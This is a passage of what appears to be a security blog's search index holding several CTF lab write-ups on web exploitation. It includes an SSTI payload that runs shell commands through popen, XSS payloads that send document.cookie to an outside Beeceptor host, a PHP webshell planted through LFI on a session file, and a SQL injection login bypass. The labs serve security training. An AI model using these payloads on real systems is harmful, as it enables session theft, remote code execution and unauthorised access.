\u0026#39;SC_GETGR_R_SIZE_MAX\u0026#39;: 69, \u0026#39;SC_GETPW_R_SIZE_MAX\u0026#39;: 70, \u0026#39;SC_INT_MAX\u0026#39;: 104, \u0026#39;SC_INT_MIN\u0026#39;: 105, \u0026#39;SC_IOV_MAX\u0026#39;: 60, \u0026#39;SC_JOB_CONTROL\u0026#39;: 7, \u0026#39;SC_LINE_MAX\u0026#39;: 43, \u0026#39;SC_LOGIN_NAME_MAX\u0026#39;: 71, \u0026#39;SC_LONG_BIT\u0026#39;: 106, \u0026#39;SC_MAPPED_FILES\u0026#39;: 16, \u0026#39;SC_MB_LEN_MAX\u0026#39;: 108, \u0026#39;SC_MEMLOCK\u0026#39;: 17, \u0026#39;SC_MEMLOCK_RANGE\u0026#39;: 18, \u0026#39;SC_MEMORY_PROTECTION\u0026#39;: 19, \u0026#39;SC_MESSAGE_PASSING\u0026#39;: 20, \u0026#39;SC_MQ_OPEN_MAX\u0026#39;: 27, \u0026#39;SC_MQ_PRIO_MAX\u0026#39;: 28, \u0026#39;SC_NGROUPS_MAX\u0026#39;: 3, \u0026#39;SC_NL_ARGMAX\u0026#39;: 119, \u0026#39;SC_NL_LANGMAX\u0026#39;: 120, \u0026#39;SC_NL_MSGMAX\u0026#39;: 121, \u0026#39;SC_NL_NMAX\u0026#39;: 122, \u0026#39;SC_NL_SETMAX\u0026#39;: 123, \u0026#39;SC_NL_TEXTMAX\u0026#39;: 124, \u0026#39;SC_NPROCESSORS_CONF\u0026#39;: 83, \u0026#39;SC_NPROCESSORS_ONLN\u0026#39;: 84, \u0026#39;SC_NZERO\u0026#39;: 109, \u0026#39;SC_OPEN_MAX\u0026#39;: 4, \u0026#39;SC_PAGESIZE\u0026#39;: 30, \u0026#39;SC_PAGE_SIZE\u0026#39;: 30, \u0026#39;SC_PASS_MAX\u0026#39;: 88, \u0026#39;SC_PHYS_PAGES\u0026#39;: 85, \u0026#39;SC_PII\u0026#39;: 53, \u0026#39;SC_PII_INTERNET\u0026#39;: 56, \u0026#39;SC_PII_INTERNET_DGRAM\u0026#39;: 62, \u0026#39;SC_PII_INTERNET_STREAM\u0026#39;: 61, \u0026#39;SC_PII_OSI\u0026#39;: 57, \u0026#39;SC_PII_OSI_CLTS\u0026#39;: 64, \u0026#39;SC_PII_OSI_COTS\u0026#39;: 63, \u0026#39;SC_PII_OSI_M\u0026#39;: 65, \u0026#39;SC_PII_SOCKET\u0026#39;: 55, \u0026#39;SC_PII_XTI\u0026#39;: 54, \u0026#39;SC_POLL\u0026#39;: 58, \u0026#39;SC_PRIORITIZED_IO\u0026#39;: 13, \u0026#39;SC_PRIORITY_SCHEDULING\u0026#39;: 10, \u0026#39;SC_REALTIME_SIGNALS\u0026#39;: 9, \u0026#39;SC_RE_DUP_MAX\u0026#39;: 44, \u0026#39;SC_RTSIG_MAX\u0026#39;: 31, \u0026#39;SC_SAVED_IDS\u0026#39;: 8, \u0026#39;SC_SCHAR_MAX\u0026#39;: 111, \u0026#39;SC_SCHAR_MIN\u0026#39;: 112, \u0026#39;SC_SELECT\u0026#39;: 59, \u0026#39;SC_SEMAPHORES\u0026#39;: 21, \u0026#39;SC_SEM_NSEMS_MAX\u0026#39;: 32, \u0026#39;SC_SEM_VALUE_MAX\u0026#39;: 33, \u0026#39;SC_SHARED_MEMORY_OBJECTS\u0026#39;: 22, \u0026#39;SC_SHRT_MAX\u0026#39;: 113, \u0026#39;SC_SHRT_MIN\u0026#39;: 114, \u0026#39;SC_SIGQUEUE_MAX\u0026#39;: 34, \u0026#39;SC_SSIZE_MAX\u0026#39;: 110, \u0026#39;SC_STREAM_MAX\u0026#39;: 5, \u0026#39;SC_SYNCHRONIZED_IO\u0026#39;: 14, \u0026#39;SC_THREADS\u0026#39;: 67, \u0026#39;SC_THREAD_ATTR_STACKADDR\u0026#39;: 77, \u0026#39;SC_THREAD_ATTR_STACKSIZE\u0026#39;: 78, \u0026#39;SC_THREAD_DESTRUCTOR_ITERATIONS\u0026#39;: 73, \u0026#39;SC_THREAD_KEYS_MAX\u0026#39;: 74, \u0026#39;SC_THREAD_PRIORITY_SCHEDULING\u0026#39;: 79, \u0026#39;SC_THREAD_PRIO_INHERIT\u0026#39;: 80, \u0026#39;SC_THREAD_PRIO_PROTECT\u0026#39;: 81, \u0026#39;SC_THREAD_PROCESS_SHARED\u0026#39;: 82, \u0026#39;SC_THREAD_SAFE_FUNCTIONS\u0026#39;: 68, \u0026#39;SC_THREAD_STACK_MIN\u0026#39;: 75, \u0026#39;SC_THREAD_THREADS_MAX\u0026#39;: 76, \u0026#39;SC_TIMERS\u0026#39;: 11, \u0026#39;SC_TIMER_MAX\u0026#39;: 35, \u0026#39;SC_TTY_NAME_MAX\u0026#39;: 72, \u0026#39;SC_TZNAME_MAX\u0026#39;: 6, \u0026#39;SC_T_IOV_MAX\u0026#39;: 66, \u0026#39;SC_UCHAR_MAX\u0026#39;: 115, \u0026#39;SC_UINT_MAX\u0026#39;: 116, \u0026#39;SC_UIO_MAXIOV\u0026#39;: 60, \u0026#39;SC_ULONG_MAX\u0026#39;: 117, \u0026#39;SC_USHRT_MAX\u0026#39;: 118, \u0026#39;SC_VERSION\u0026#39;: 29, \u0026#39;SC_WORD_BIT\u0026#39;: 107, \u0026#39;SC_XBS5_ILP32_OFF32\u0026#39;: 125, \u0026#39;SC_XBS5_ILP32_OFFBIG\u0026#39;: 126, \u0026#39;SC_XBS5_LP64_OFF64\u0026#39;: 127, \u0026#39;SC_XBS5_LPBIG_OFFBIG\u0026#39;: 128, \u0026#39;SC_XOPEN_CRYPT\u0026#39;: 92, \u0026#39;SC_XOPEN_ENH_I18N\u0026#39;: 93, \u0026#39;SC_XOPEN_LEGACY\u0026#39;: 129, \u0026#39;SC_XOPEN_REALTIME\u0026#39;: 130, \u0026#39;SC_XOPEN_REALTIME_THREADS\u0026#39;: 131, \u0026#39;SC_XOPEN_SHM\u0026#39;: 94, \u0026#39;SC_XOPEN_UNIX\u0026#39;: 91, \u0026#39;SC_XOPEN_VERSION\u0026#39;: 89, \u0026#39;SC_XOPEN_XCU_VERSION\u0026#39;: 90, \u0026#39;SC_XOPEN_XPG2\u0026#39;: 98, \u0026#39;SC_XOPEN_XPG3\u0026#39;: 99, \u0026#39;SC_XOPEN_XPG4\u0026#39;: 100}, \u0026#39;error\u0026#39;: \u0026lt;class \u0026#39;OSError\u0026#39;\u0026gt;, \u0026#39;waitid_result\u0026#39;: \u0026lt;class \u0026#39;posix.waitid_result\u0026#39;\u0026gt;, \u0026#39;stat_result\u0026#39;: \u0026lt;class \u0026#39;os.stat_result\u0026#39;\u0026gt;, \u0026#39;statvfs_result\u0026#39;: \u0026lt;class \u0026#39;os.statvfs_result\u0026#39;\u0026gt;, \u0026#39;sched_param\u0026#39;: \u0026lt;class \u0026#39;posix.sched_param\u0026#39;\u0026gt;, \u0026#39;terminal_size\u0026#39;: \u0026lt;class \u0026#39;os.terminal_size\u0026#39;\u0026gt;, \u0026#39;DirEntry\u0026#39;: \u0026lt;class \u0026#39;posix.DirEntry\u0026#39;\u0026gt;, \u0026#39;times_result\u0026#39;: \u0026lt;class \u0026#39;posix.times_result\u0026#39;\u0026gt;, \u0026#39;uname_result\u0026#39;: \u0026lt;class \u0026#39;posix.uname_result\u0026#39;\u0026gt;, \u0026#39;_exit\u0026#39;: \u0026lt;built-in function _exit\u0026gt;, \u0026#39;path\u0026#39;: \u0026lt;module \u0026#39;posixpath\u0026#39; (frozen)\u0026gt;, \u0026#39;curdir\u0026#39;: \u0026#39;.\u0026#39;, \u0026#39;pardir\u0026#39;: \u0026#39;..\u0026#39;, \u0026#39;sep\u0026#39;: \u0026#39;/\u0026#39;, \u0026#39;pathsep\u0026#39;: \u0026#39;:\u0026#39;, \u0026#39;defpath\u0026#39;: \u0026#39;/bin:/usr/bin\u0026#39;, \u0026#39;extsep\u0026#39;: \u0026#39;.\u0026#39;, \u0026#39;altsep\u0026#39;: None, \u0026#39;devnull\u0026#39;: \u0026#39;/dev/null\u0026#39;, \u0026#39;supports_dir_fd\u0026#39;: {\u0026lt;built-in function stat\u0026gt;, \u0026lt;built-in function link\u0026gt;, \u0026lt;built-in function open\u0026gt;, \u0026lt;built-in function chmod\u0026gt;, \u0026lt;built-in function utime\u0026gt;, \u0026lt;built-in function unlink\u0026gt;, \u0026lt;built-in function access\u0026gt;, \u0026lt;built-in function rename\u0026gt;, \u0026lt;built-in function rmdir\u0026gt;, \u0026lt;built-in function readlink\u0026gt;, \u0026lt;built-in function mkfifo\u0026gt;, \u0026lt;built-in function mknod\u0026gt;, \u0026lt;built-in function symlink\u0026gt;, \u0026lt;built-in function chown\u0026gt;, \u0026lt;built-in function mkdir\u0026gt;}, \u0026#39;supports_effective_ids\u0026#39;: {\u0026lt;built-in function access\u0026gt;}, \u0026#39;supports_fd\u0026#39;: {\u0026lt;built-in function stat\u0026gt;, \u0026lt;built-in function chmod\u0026gt;, \u0026lt;built-in function execve\u0026gt;, \u0026lt;built-in function utime\u0026gt;, \u0026lt;built-in function listdir\u0026gt;, \u0026lt;built-in function statvfs\u0026gt;, \u0026lt;built-in function scandir\u0026gt;, \u0026lt;built-in function truncate\u0026gt;, \u0026lt;built-in function pathconf\u0026gt;, \u0026lt;built-in function chdir\u0026gt;, \u0026lt;built-in function chown\u0026gt;}, \u0026#39;supports_follow_symlinks\u0026#39;: {\u0026lt;built-in function stat\u0026gt;, \u0026lt;built-in function link\u0026gt;, \u0026lt;built-in function utime\u0026gt;, \u0026lt;built-in function access\u0026gt;, \u0026lt;built-in function chown\u0026gt;}, \u0026#39;SEEK_SET\u0026#39;: 0, \u0026#39;SEEK_CUR\u0026#39;: 1, \u0026#39;SEEK_END\u0026#39;: 2, \u0026#39;makedirs\u0026#39;: \u0026lt;function makedirs at 0x7fceecad8b80\u0026gt;, \u0026#39;removedirs\u0026#39;: \u0026lt;function removedirs at 0x7fceecadb920\u0026gt;, \u0026#39;renames\u0026#39;: \u0026lt;function renames at 0x7fceecae0ea0\u0026gt;, \u0026#39;walk\u0026#39;: \u0026lt;function walk at 0x7fceecae0f40\u0026gt;, \u0026#39;_walk\u0026#39;: \u0026lt;function _walk at 0x7fceecae0fe0\u0026gt;, \u0026#39;fwalk\u0026#39;: \u0026lt;function fwalk at 0x7fceecae1080\u0026gt;, \u0026#39;_fwalk\u0026#39;: \u0026lt;function _fwalk at 0x7fceecae1120\u0026gt;, \u0026#39;execl\u0026#39;: \u0026lt;function execl at 0x7fceecae11c0\u0026gt;, \u0026#39;execle\u0026#39;: \u0026lt;function execle at 0x7fceecae1260\u0026gt;, \u0026#39;execlp\u0026#39;: \u0026lt;function execlp at 0x7fceecae1300\u0026gt;, \u0026#39;execlpe\u0026#39;: \u0026lt;function execlpe at 0x7fceecae13a0\u0026gt;, \u0026#39;execvp\u0026#39;: \u0026lt;function execvp at 0x7fceecae1440\u0026gt;, \u0026#39;execvpe\u0026#39;: \u0026lt;function execvpe at 0x7fceecae14e0\u0026gt;, \u0026#39;_execvpe\u0026#39;: \u0026lt;function _execvpe at 0x7fceecae1580\u0026gt;, \u0026#39;get_exec_path\u0026#39;: \u0026lt;function get_exec_path at 0x7fceecae1620\u0026gt;, \u0026#39;MutableMapping\u0026#39;: \u0026lt;class \u0026#39;collections.abc.MutableMapping\u0026#39;\u0026gt;, \u0026#39;Mapping\u0026#39;: \u0026lt;class \u0026#39;collections.abc.Mapping\u0026#39;\u0026gt;, \u0026#39;_Environ\u0026#39;: \u0026lt;class \u0026#39;os._Environ\u0026#39;\u0026gt;, \u0026#39;getenv\u0026#39;: \u0026lt;function getenv at 0x7fceecae16c0\u0026gt;, \u0026#39;supports_bytes_environ\u0026#39;: True, \u0026#39;environb\u0026#39;: environ({b\u0026#39;HOSTNAME\u0026#39;: b\u0026#39;2a88d9e3b6e8\u0026#39;, b\u0026#39;PYTHON_PIP_VERSION\u0026#39;: b\u0026#39;22.3\u0026#39;, b\u0026#39;HOME\u0026#39;: b\u0026#39;/root\u0026#39;, b\u0026#39;GPG_KEY\u0026#39;: b\u0026#39;A035C8C19219BA821ECEA86B64E628F8D684696D\u0026#39;, b\u0026#39;PYTHON_GET_PIP_URL\u0026#39;: b\u0026#39;https://github.com/pypa/get-pip/raw/66030fa03382b4914d4c4d0896961a0bdeeeb274/public/get-pip.py\u0026#39;, b\u0026#39;PATH\u0026#39;: b\u0026#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#39;, b\u0026#39;LANG\u0026#39;: b\u0026#39;C.UTF-8\u0026#39;, b\u0026#39;PYTHON_VERSION\u0026#39;: b\u0026#39;3.11.0\u0026#39;, b\u0026#39;PYTHON_SETUPTOOLS_VERSION\u0026#39;: b\u0026#39;65.5.0\u0026#39;, b\u0026#39;PWD\u0026#39;: b\u0026#39;/code\u0026#39;, b\u0026#39;PYTHON_GET_PIP_SHA256\u0026#39;: b\u0026#39;1e501cf004eac1b7eb1f97266d28f995ae835d30250bec7f8850562703067dc6\u0026#39;, b\u0026#39;WERKZEUG_SERVER_FD\u0026#39;: b\u0026#39;3\u0026#39;}), \u0026#39;getenvb\u0026#39;: \u0026lt;function getenvb at 0x7fceecae2160\u0026gt;, \u0026#39;fsencode\u0026#39;: \u0026lt;function _fscodec.\u0026lt;locals\u0026gt;.fsencode at 0x7fceecae22a0\u0026gt;, \u0026#39;fsdecode\u0026#39;: \u0026lt;function _fscodec.\u0026lt;locals\u0026gt;.fsdecode at 0x7fceecae2340\u0026gt;, \u0026#39;P_WAIT\u0026#39;: 0, \u0026#39;P_NOWAIT\u0026#39;: 1, \u0026#39;P_NOWAITO\u0026#39;: 1, \u0026#39;_spawnvef\u0026#39;: \u0026lt;function _spawnvef at 0x7fceecae2200\u0026gt;, \u0026#39;spawnv\u0026#39;: \u0026lt;function spawnv at 0x7fceecae23e0\u0026gt;, \u0026#39;spawnve\u0026#39;: \u0026lt;function spawnve at 0x7fceecae2480\u0026gt;, \u0026#39;spawnvp\u0026#39;: \u0026lt;function spawnvp at 0x7fceecae2520\u0026gt;, \u0026#39;spawnvpe\u0026#39;: \u0026lt;function spawnvpe at 0x7fceecae25c0\u0026gt;, \u0026#39;spawnl\u0026#39;: \u0026lt;function spawnl at 0x7fceecae2660\u0026gt;, \u0026#39;spawnle\u0026#39;: \u0026lt;function spawnle at 0x7fceecae2700\u0026gt;, \u0026#39;spawnlp\u0026#39;: \u0026lt;function spawnlp at 0x7fceecae27a0\u0026gt;, \u0026#39;spawnlpe\u0026#39;: \u0026lt;function spawnlpe at 0x7fceecae2840\u0026gt;, \u0026#39;popen\u0026#39;: \u0026lt;function popen at 0x7fceecae28e0\u0026gt;, \u0026#39;_wrap_close\u0026#39;: \u0026lt;class \u0026#39;os._wrap_close\u0026#39;\u0026gt;, \u0026#39;fdopen\u0026#39;: \u0026lt;function fdopen at 0x7fceecae2980\u0026gt;, \u0026#39;_fspath\u0026#39;: \u0026lt;function _fspath at 0x7fceecae2de0\u0026gt;, \u0026#39;PathLike\u0026#39;: \u0026lt;class \u0026#39;os.PathLike\u0026#39;\u0026gt;} ::: Then we can open system and write the command Payload: {{[].__class__.__base__.__subclasses__()[140].__init__.__globals__['popen']('ls').read()}} → Output: Hello app.py flag flag.txt instance requirements.txt templates Then we got flag!!! "},{"id":431,"href":"/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/","title":"Simple Web - 0x08(Lab - `Particles.js`)","section":"Securities","content":" Simple Web - 0x08(Lab - Particles.js) # tags: CTF Web eductf # Challenge: https://particles.ctf.zoolab.org\nDescription # The website can change the theme of layout. The main goal is to leak admin\u0026rsquo;s cookie.\nSource Code # Analysis # Exploit - XSS # Use burp suit to check if the website has XSS vulnerability. Try to modify config parameter Payload 1: 1;alert(123);console.log({x://\\ :::spoiler Response 1\n... \u0026lt;script\u0026gt; url.value = location; config.value = \u0026#39;1; alert(123); console.log({x://\\\u0026#39;; fetch(\u0026#39;/1;alert(123);console.log({x://\\.json\u0026#39;).then(r =\u0026gt; r.json()).then(json =\u0026gt; { particlesJS(\u0026#34;particles-js\u0026#34;, json) }) \u0026lt;/script\u0026gt; ... ::: or Payload 2: \u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(123);\u0026lt;/script\u0026gt; :::spoiler Response 2\n... \u0026lt;script\u0026gt; url.value = location; config.value = \u0026#39; \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; alert(123); \u0026lt;/script\u0026gt; \u0026#39;; fetch(\u0026#39;/\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; alert(123); \u0026lt;/script\u0026gt; .json\u0026#39;).then(r =\u0026gt; r.json()).then(json =\u0026gt; { particlesJS(\u0026#34;particles-js\u0026#34;, json) }) \u0026lt;/script\u0026gt; ... ::: or Payload 3: \u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(123);\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;console.log({x:// :::spoiler Response 3\n... \u0026lt;script\u0026gt; url.value = location; config.value = \u0026#39; \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; alert(123); \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; console.log({x://\u0026#39;; fetch(\u0026#39;/ \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; alert(123); \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; console.log({x://.json\u0026#39;).then(r =\u0026gt; r.json()).then(json =\u0026gt; { particlesJS(\u0026#34;particles-js\u0026#34;, json) }) \u0026lt;/script\u0026gt; ... ::: fetch + Beeceptor Payload:\n\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;fetch(%22https://sbk6401.free.beeceptor.com?%22%2bdocument.cookie);\u0026lt;/script\u0026gt; Note that: MUST TRANSFER + AND \u0026quot; TO %2B AND %22 RESPECTIVELY URL:\nhttps://particles.ctf.zoolab.org/?config=%3C/script%3E%3Cscript%3Efetch(%22https://sbkkk.free.beeceptor.com?%22%2bdocument.cookie);%3C/script%3E Report to author Must encoded by URL encode Payload:\nhttps%3A%2F%2Fparticles.ctf.zoolab.org%2F%3Fconfig%3D%3C%2Fscript%3E%3Cscript%3Efetch%28%2522https%3A%2F%2Fsbkkk.free.beeceptor.com%3F%2522%252bdocument.cookie%29%3B%3C%2Fscript%3E Other payload: :::spoiler payload Payload 2 url=https%3A%2F%2Fparticles.ctf.zoolab.org%2F%3Fconfig%3D%3C%2Fscript%3E%3Cscript%3Efetch%28%2522https%3A%2F%2Fsbk6401.free.beeceptor.com%3F%2522%252bdocument.cookie%29%3B%3C%2Fscript%3E%3Cscript%3Econsole.log%28%7Bx%3A%2F%2F Payload 3 url=https%3A%2F%2Fparticles.ctf.zoolab.org%2F%3Fconfig%3D%3C%2Fscript%3E%3Cscript%3Efetch%28%2522https%3A%2F%2Fsbk6401.free.beeceptor.com%3F%2522%252bdocument.cookie%29%3B%3C%2Fscript%3E ::: "},{"id":432,"href":"/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/","title":"Simple Web - 0x09(Lab - Simple Note)","section":"Securities","content":" Simple Web - 0x09(Lab - Simple Note) # tags: CTF Web eductf # Challenge: https://note.ctf.zoolab.org/\nBackground # Source Code # ... \u0026lt;script\u0026gt; const id = location.pathname.split(\u0026#39;/\u0026#39;).pop(); fetch(`/api/note/${id}`).then(r =\u0026gt; r.json()).then(({ title, content })=\u0026gt;{ url.value = location; titleNode.innerHTML = title; contentNode.innerText = content; }); \u0026lt;/script\u0026gt; ... For instance, if our $id=47a8aad1b3b82dcd4decd36d, the script code will fetch this data as json file and parse title and content. Then it\u0026rsquo;ll change titleNode by innerHTML and change contentNode by innerText. innerText VS innerHTML # innerText will filter tag but innerHTML will not. For instance, title=123 and content=\u0026lt;script\u0026gt;123\u0026lt;/script\u0026gt; For instance, title=\u0026lt;script\u0026gt;123\u0026lt;/script\u0026gt; and content=123 Analysis # According to the response, it seems has no filter of our input, so, we can choose to inject something in titleNode Exploit - XSS # We tried to inject \u0026lt;script\u0026gt; tag in title but has nothing to trigger. According to javascript documentation\nIt is not uncommon to see innerHTML used to insert text into a web page. There is potential for this to become an attack vector on a site, creating a potential security risk. Although this may look like a cross-site scripting attack, the result is harmless. HTML specifies that a \u0026lt;script\u0026gt; tag inserted with innerHTML should not execute.\nHowever, there are ways to execute JavaScript without using \u0026lt;script\u0026gt; elements, so there is still a security risk whenever you use innerHTML to set strings over which you have no control. For example:\nconst name = \u0026#34;\u0026lt;img src=\u0026#39;x\u0026#39; onerror=\u0026#39;fetch()\u0026#39;\u0026gt;\u0026#34;; el.innerHTML = name; // shows the alert Use img tag Payload: \u0026lt;img src='x' onerror='alert(1)'\u0026gt; String limit problem\u0026hellip; There\u0026rsquo;s something wrong, that the title has input limit with 40 character at most. So, we can use window.name technique that we can write our payload as long as we can. If we set:\ntop.name = \u0026#39;fetch(\u0026#34;https://sbk6401.free.beeceptor.com?sh=\u0026#34;+document.cookie)\u0026#39; Furthermore, we set our title as:\u0026lt;img src=x onerror=eval(window.name)\u0026gt;\nThen if we reload this page, it\u0026rsquo;ll execute the command in top.name Host a server by Beeceptor Note that, you should change Content-Type to text/html Then we can change the Report URL as what we set in Beeceptor Detail about workflow\nst=\u0026gt;start: Start e=\u0026gt;end: get flag in Beeceptor op=\u0026gt;operation: Set title to \u0026lt;img src=x onerror=eval(top.name)\u0026gt; io=\u0026gt;inputoutput: Click Report op2=\u0026gt;operation: Set URL as https://sbk6401.free.beeceptor.com op3=\u0026gt;operation: Execute our script that set in beeceptor op4=\u0026gt;operation: Set top.name as our payload op5=\u0026gt;operation: redirect to https://note.ctf.zoolab.org/note/fafe93de9467a6022fb8cb19 op6=\u0026gt;operation: eval(top.name) st-\u0026gt;op-\u0026gt;io-\u0026gt;op2-\u0026gt;op3-\u0026gt;op4-\u0026gt;op5-\u0026gt;op6-\u0026gt;e Reference # 在XSS测试中如何绕过字符长度限制\n"},{"id":433,"href":"/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/","title":"Simple Web 0x01(Lab - `gitleak`)","section":"Securities","content":" Simple Web 0x01(Lab - gitleak) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:9000/\nExploit - gitleak + basic Git command # Use the extension of Firefox(or Google), Dotgit, to check if the website actually has git leak problem denny0223/scrabble To use scrabble tool to leak information\n$ git clone https://github.com/denny0223/scrabble.git $ cd scrabble $ sudo ./scrabble http://h4ck3r.quest:9000/ Still no flag There\u0026rsquo;s flag.php but still no flag in there. HEAD said HEAD is now at a0228bd Remove flag. Thus, we can look up the history by the command below.\n$ git log --stat a0228bd commit a0228bd6ff968f3eca017125a5434b517ad2a83a (HEAD -\u0026gt; master) Author: splitline \u0026lt;tbsthitw@gmail.com\u0026gt; Date: Wed Mar 9 16:23:46 2022 +0800 Remove flag. flag.php | 2 +- 1 file changed, 1 insertion(+), 1 deletion(-) commit 6cfe38db75ec90126f53088ea87c286c83c1bfb3 Author: splitline \u0026lt;tbsthitw@gmail.com\u0026gt; Date: Wed Mar 9 16:23:15 2022 +0800 Init flag.php | 5 +++++ index.php | 1 + 2 files changed, 6 insertions(+) Check the difference of commit version\n$ git diff HEAD \u0026lt;commit-id\u0026gt; diff --git a/flag.php b/flag.php index d1f8785..5b6cf79 100644 --- a/flag.php +++ b/flag.php @@ -1,5 +1,5 @@ \u0026lt;?php -// No flag for you! +$FLAG = \u0026ldquo;FLAG{gitleak_is_fun}\u0026rdquo;; ?\u0026gt;\nFlag is in the source code. \\ No newline at end of file\n"},{"id":434,"href":"/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/","title":"Simple Web 0x01(Lab - Hello from Windows 98)","section":"Securities","content":" Simple Web 0x01(Lab - Hello from Windows 98) # tags: CTF Web eductf # Challenge: https://windows.ctf.zoolab.org/\nVery similar to 0x07(Lab - HakkaMD)\nSource code # :::spoiler code\n\u0026lt;?php session_start(); if(isset($_GET[\u0026#39;source\u0026#39;])){ highlight_file(\u0026#39;./\u0026#39;.$_GET[\u0026#39;source\u0026#39;].\u0026#39;.php\u0026#39;); die(); } if(isset($_GET[\u0026#39;name\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;name\u0026#39;]!=\u0026#39;\u0026#39;){ $_SESSION[\u0026#39;name\u0026#39;] = $_GET[\u0026#39;name\u0026#39;]; header(\u0026#34;Location: /?page=hi.php\u0026#34;); die(); } if(!isset($_GET[\u0026#39;page\u0026#39;])){ header(\u0026#34;Location: /?page=say.php\u0026#34;); die(); } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Hello from Windows 98\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://unpkg.com/98.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;style\u0026gt; body{ background: url(\u0026#39;blue.png\u0026#39;); background-size: cover; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; } \u0026lt;/style\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;window\u0026#34; style=\u0026#34;margin: 32px; width: 500px\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;title-bar\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;title-bar-text\u0026#34;\u0026gt; Hello World.. \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;title-bar-controls\u0026#34;\u0026gt; \u0026lt;button aria-label=\u0026#34;Minimize\u0026#34;\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;button aria-label=\u0026#34;Maximize\u0026#34;\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;button aria-label=\u0026#34;Close\u0026#34;\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;window-body\u0026#34;\u0026gt; \u0026lt;?php include($_GET[\u0026#39;page\u0026#39;]);?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::\nExploit - LFI to RCE # First things first, the website has LFI problem https://windows.ctf.zoolab.org/?page=/etc/passwd 通靈 It didn\u0026rsquo;t provide any information about system, so we can assume the setting is default at first.\nwebshell \u0026lt;?php system($_GET['sh']); ?\u0026gt; ↓ We use LFI to read session file: https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829 It execute system function successfully. ↓ https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829\u0026amp;sh=ls%20/var/www/html ↓ ↓ https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829\u0026amp;sh=cat%20/var/www/html/flag.txt\nThen we got flag!!!\n"},{"id":435,"href":"/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/","title":"Simple Web 0x02(Lab - `.DS_Store`)","section":"Securities","content":" Simple Web 0x02(Lab - .DS_Store) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:9001/\nExploit - .DS_Store # Clone lijiejie/ds_store_exp\n$ git clone https://github.com/lijiejie/ds_store_exp.git $ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store [200] http://h4ck3r.quest:9001/.DS_Store [200] http://h4ck3r.quest:9001/super_secret_meowmeow.php [200] http://h4ck3r.quest:9001/index.php $ cd h4ck3r.quest_9001 $ cat super_secret_meowmeow.php FLAG{.DS_Store is so annoying lmao} Note that, must install python 2, requests, ds_store and modify queue(import queue→import Queue as queue) $ conda create --name py2.7 python=2.7 $ conda install -c auto ds_store $ conda install -c anaconda requests Reference # python-no-module-named-queue\n"},{"id":436,"href":"/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/","title":"Simple Web 0x03(Lab - Log me in + Revenge)","section":"Securities","content":" Simple Web 0x03(Lab - Log me in + Revenge) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8200/ Challenge: http://h4ck3r.quest:8201/\nExploit - SQLi # Payload → ') or ('1'='1') -- # SELECT * FROM admin WHERE (username=\u0026rsquo;\u0026rsquo;) or (\u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\u0026rsquo;) \u0026ndash; #\u0026rsquo;) AND (password=\u0026lsquo;MTIz\u0026rsquo;) Flag: FLAG{b4by_sql_inj3cti0n}\nRevenge source code # :::spoiler code\nfrom flask import Flask, render_template, redirect, request, g, Response import sqlite3 app = Flask(__name__) def get_db(): db = getattr(g, \u0026#39;_database\u0026#39;, None) if db is None: db = g._database = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) db.row_factory = sqlite3.Row return db @app.before_first_request def init_db(): cursor = get_db().cursor() cursor.execute(\u0026#34;\u0026#34;\u0026#34; CREATE TABLE IF NOT EXISTS \u0026#34;admin\u0026#34; ( \u0026#34;username\u0026#34; TEXT NOT NULL, \u0026#34;password\u0026#34; TEXT NOT NULL ) \u0026#34;\u0026#34;\u0026#34;) cursor.execute(\u0026#34;SELECT COUNT(*) as count FROM admin WHERE username=\u0026#39;admin\u0026#39;\u0026#34;) count = cursor.fetchone()[\u0026#39;count\u0026#39;] if count == 0: import secrets cursor.execute(\u0026#34;INSERT INTO admin (username, password) VALUES (?,?)\u0026#34;, (\u0026#39;admin\u0026#39;, secrets.token_urlsafe())) get_db().commit() @app.teardown_appcontext def close_connection(exception): db = getattr(g, \u0026#39;_database\u0026#39;, None) if db is not None: db.close() 